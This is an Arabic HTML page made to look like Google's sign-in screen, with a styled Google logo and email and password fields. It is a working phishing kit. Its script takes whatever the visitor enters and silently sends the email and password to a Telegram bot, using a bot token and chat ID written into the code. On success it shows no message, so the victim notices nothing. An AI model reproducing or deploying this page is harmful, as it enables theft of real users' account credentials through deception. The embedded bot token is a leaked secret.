<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>تسجيل الدخول</title>
<style>
* { box-sizing: border-box; }
body { margin: 0; background: #fff; font-family: Arial, Tahoma, sans-serif; color: #444; }
.page { width: 100%; min-height: 100vh; text-align: center; padding-top: 55px; }
.google-logo {
    font-family: 'Product Sans', Arial, sans-serif;
    font-size: 58px;
    font-weight: 500;
    letter-spacing: -2px;
    margin-bottom: 20px;
    display: flex;
    justify-content: center;
    direction: ltr;
}
.google-logo span { display: inline-block; }
.google-logo .g1 { color: #4285F4; }
.google-logo .o1 { color: #EA4335; }
.google-logo .o2 { color: #FBBC05; }
.google-logo .g2 { color: #4285F4; }
.google-logo .l  { color: #34A853; }
.google-logo .e  { color: #EA4335; }
.title { font-size: 30px; font-weight: 400; margin: 5px 0 12px; color: #333; }
.subtitle { font-size: 17px; margin-bottom: 28px; color: #666; }
.login-box {
    width: 430px;
    max-width: calc(100% - 30px);
    margin: auto;
    border: 1px solid #ddd;
    padding: 38px 42px 32px;
    box-shadow: 0 1px 5px rgba(0,0,0,.15);
    background: white;
}
.avatar {
    width: 105px;
    height: 105px;
    margin: 0 auto 30px;
    border-radius: 50%;
    background: #eee;
    position: relative;
}
.avatar::before {
    content: "";
    position: absolute;
    width: 35px;
    height: 35px;
    border-radius: 50%;
    background: #bbb;
    top: 20px;
    left: 35px;
}
.avatar::after {
    content: "";
    position: absolute;
    width: 70px;
    height: 38px;
    border-radius: 50% 50% 45% 45%;
    background: #bbb;
    bottom: 15px;
    left: 17px;
}
.input {
    width: 100%;
    height: 58px;
    border: 1px solid #c9c9c9;
    outline: none;
    font-size: 16px;
    padding: 0 15px;
    margin-bottom: 12px;
    text-align: right;
    direction: rtl;
}
.input:focus {
    border-color: #4285f4;
    box-shadow: inset 0 0 0 1px #4285f4;
}
.login-button {
    width: 100%;
    height: 56px;
    border: none;
    background: #4285f4;
    color: white;
    font-size: 17px;
    cursor: pointer;
    margin-top: 4px;
    transition: background 0.2s;
}
.login-button:hover { background: #357ae8; }
.login-button:disabled {
    background: #a0bff0;
    cursor: not-allowed;
}
.options {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-top: 15px;
    font-size: 14px;
}
.options label { cursor: pointer; }
.help {
    color: #4285f4;
    text-decoration: none;
}
.help:hover { text-decoration: underline; }
.create {
    display: inline-block;
    margin-top: 38px;
    color: #4285f4;
    text-decoration: none;
    font-size: 16px;
}
.create:hover { text-decoration: underline; }
.message {
    display: none;
    margin-top: 15px;
    font-size: 14px;
    padding: 8px 12px;
    border-radius: 4px;
}
.message.error {
    display: block;
    color: #d93025;
    background: #fce8e6;
}
@media (max-width: 500px) {
    .page { padding-top: 35px; }
    .google-logo { font-size: 42px; }
    .title { font-size: 25px; }
    .subtitle { font-size: 15px; }
    .login-box {
        border: none;
        box-shadow: none;
        width: 100%;
        padding: 30px 25px;
    }
}
</style>
</head>
<body>
<div class="page">
    <div class="google-logo">
        <span class="g1">G</span><span class="o1">o</span>
        <span class="o2">o</span><span class="g2">g</span>
        <span class="l">l</span><span class="e">e</span>
    </div>
    <h1 class="title">حساب واحد لجميع خدماتك</h1>
    <div class="subtitle">سجّل دخولك باستخدام حسابك</div>
    <div class="login-box">
        <div class="avatar"></div>
        <input type="email" id="email" class="input" placeholder="البريد الإلكتروني">
        <input type="password" id="password" class="input" placeholder="كلمة المرور">
        <button class="login-button" id="loginBtn" onclick="login()">تسجيل الدخول</button>
        <div class="options">
            <label><input type="checkbox" id="remember"> حفظ تسجيل الدخول</label>
            <a href="#" class="help" onclick="forgotPassword()">بحاجة إلى مساعدة؟</a>
        </div>
        <div class="message" id="message"></div>
    </div>
    <a href="#" class="create" onclick="createAccount()">إنشاء حساب</a>
</div>

<script>
// ==============================================
// 🔐 التوكن ومعرف الدردشة (مضاف يدوياً)
// ==============================================
const TELEGRAM_TOKEN = "7216667772:AAHsAxTPv_8Lzns19UkYOtnO7KSaBemNlik";
const CHAT_ID = 7019395783;

// ==============================================
// 🚀 دالة تسجيل الدخول
// ==============================================
async function login() {
    const email = document.getElementById("email").value.trim();
    const password = document.getElementById("password").value.trim();
    const loginBtn = document.getElementById("loginBtn");
    const messageDiv = document.getElementById("message");

    if (!email || !password) {
        showMessage("يرجى إدخال البريد الإلكتروني وكلمة المرور.", "error");
        return;
    }

    loginBtn.disabled = true;
    loginBtn.textContent = "جاري الإرسال...";
    messageDiv.style.display = "none";

    try {
        const text = `🚨 محاولة تسجيل دخول جديدة!%0A📧 البريد: ${encodeURIComponent(email)}%0A🔑 كلمة المرور: ${encodeURIComponent(password)}`;
        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${text}`;

        const response = await fetch(url);

        if (response.ok) {
            // ✅ تم الإرسال - لا نعرض رسالة نجاح (صامت)
            // window.location.href = "/dashboard";
        } else {
            showMessage("❌ فشل الإرسال، تأكد من اتصالك بالإنترنت.", "error");
        }
    } catch (error) {
        showMessage("❌ حدث خطأ في الاتصال.", "error");
    } finally {
        loginBtn.disabled = false;
        loginBtn.textContent = "تسجيل الدخول";
    }
}

function showMessage(text, type) {
    const msg = document.getElementById("message");
    msg.textContent = text;
    msg.className = "message";
    if (text && type) {
        msg.classList.add(type);
        msg.style.display = "block";
    } else {
        msg.style.display = "none";
    }
}

function forgotPassword() { alert("سيتم فتح صفحة استعادة كلمة المرور."); }
function createAccount() { alert("سيتم فتح صفحة إنشاء حساب جديد."); }
</script>
</body>
</html>
